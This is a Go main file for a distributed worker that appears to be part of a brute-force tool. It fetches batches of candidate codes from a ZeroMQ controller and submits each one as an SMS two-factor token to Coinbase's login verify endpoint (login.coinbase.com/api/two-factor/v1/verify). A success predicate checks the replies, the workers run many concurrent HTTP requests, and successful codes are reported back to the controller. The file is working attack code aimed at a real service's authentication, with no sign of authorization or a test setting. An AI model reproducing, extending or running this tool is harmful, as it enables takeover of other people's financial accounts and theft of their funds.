package main

import (
	"context"
	"github.com/google/uuid"
	"github.com/skirkyn/dcw/cmd/common"
	"github.com/skirkyn/dcw/cmd/util"
	"github.com/skirkyn/dcw/cmd/worker/client/zmq"
	"github.com/skirkyn/dcw/cmd/worker/result"
	"github.com/skirkyn/dcw/cmd/worker/runner"
	"github.com/skirkyn/dcw/cmd/worker/sfv"
	"github.com/skirkyn/dcw/cmd/worker/verifier/hr"
	"github.com/skirkyn/dcw/cmd/worker/verifier/hr/cb"
	"golang.org/x/sync/semaphore"
	"log"
	"net/http"
	"runtime"
	"time"
)

const controllerHost = "CONTROLLER_HOST"
const controllerWorkPort = "CONTROLLER_WORK_PORT"
const controllerResultPort = "CONTROLLER_RESULT_PORT"
const connAttempts = "CONNECTION_ATTEMPTS"
const connAttemptsTtsSec = "CONNECTION_ATTEMPTS_TTS_SEC"
const batchSize = "WORK_BATCH_SIZE"

// will be extracted later
var defaultRequestTemplate = `{
  "sms": {
    "token": "%s"
  },
  "constraints": {
    "mode": "ALLOW",
    "types": [
      "NO_2FA",
      "SMS",
      "TOTP",
      "U2F",
      "IDV",
      "RECOVERY_CODE",
      "PUSH",
      "PASSKEY",
      "SECURITY_QUESTION"
    ]
  },
  "action": "web-UnifiedLogin-IdentificationPrompt",
  "bot_token": ""
}`

var defaultHeaders = make(map[string]string)

func main() {
	rnr := getRunner()
	wg := rnr.Start()
	wg.Done()
}
func getRunner() runner.Runner {

	workClientConfig := zmq.Config{

		Host:                                 util.GetEnvString(controllerHost, "localhost"),
		Port:                                 util.GetEnvInt(controllerWorkPort, 50000),
		Id:                                   uuid.NewString(),
		MaxConnectAttempts:                   util.GetEnvInt(connAttempts, 10),
		TimeToSleepBetweenConnectionAttempts: time.Duration(util.GetEnvInt(connAttemptsTtsSec, 5)),
	}

	workClient, err := zmq.NewZMQClient(workClientConfig)

	if err != nil {
		log.Fatal("can't create workClient", err)
	}

	resultClientConfig := zmq.Config{

		Host:                                 util.GetEnvString(controllerHost, "localhost"),
		Port:                                 util.GetEnvInt(controllerResultPort, 50001),
		Id:                                   uuid.NewString(),
		MaxConnectAttempts:                   util.GetEnvInt(connAttempts, 10),
		TimeToSleepBetweenConnectionAttempts: time.Duration(util.GetEnvInt(connAttemptsTtsSec, 5)),
	}

	resultClient, err := zmq.NewZMQClient(resultClientConfig)

	if err != nil {
		log.Fatal("can't create resultClient", err)
	}
	runnerConfig := runner.Config{WorkersCount: runtime.NumCPU() * 3}  // for bf & http, a lot of io
	sem := semaphore.NewWeighted(int64(runnerConfig.WorkersCount * 2)) // second batch pulls while the first one is running
	ctx := context.Background()
	workReqTrans := common.NewRequestTransformer[int]()
	workRespTrans := common.NewResponseTransformer[[]string]()

	resultRequestTrans := common.NewRequestTransformer[string]()
	verifyRequestSupplier := hr.NewRequestSupplier[string]("POST", hr.NewSimpleHeadersSupplier[string](defaultHeaders), "https://login.coinbase.com/api/two-factor/v1/verify", hr.NewFormattingBodySupplier[string](defaultRequestTemplate))

	successPredicate := cb.NewSuccessPredicate()
	verifier := hr.NewVerifier[string](http.DefaultClient, verifyRequestSupplier, successPredicate)
	worker := sfv.NewWorker(sem, ctx, workRespTrans, verifier)
	workReqSupplier := sfv.NewSupplier(util.GetEnvInt(batchSize, 100), workReqTrans, sem, ctx)
	resHandler := result.NewHandler[string](resultClient, resultRequestTrans)

	return runner.NewDefaultRunner[string](runnerConfig, workClient, worker, workReqSupplier, resHandler)
}
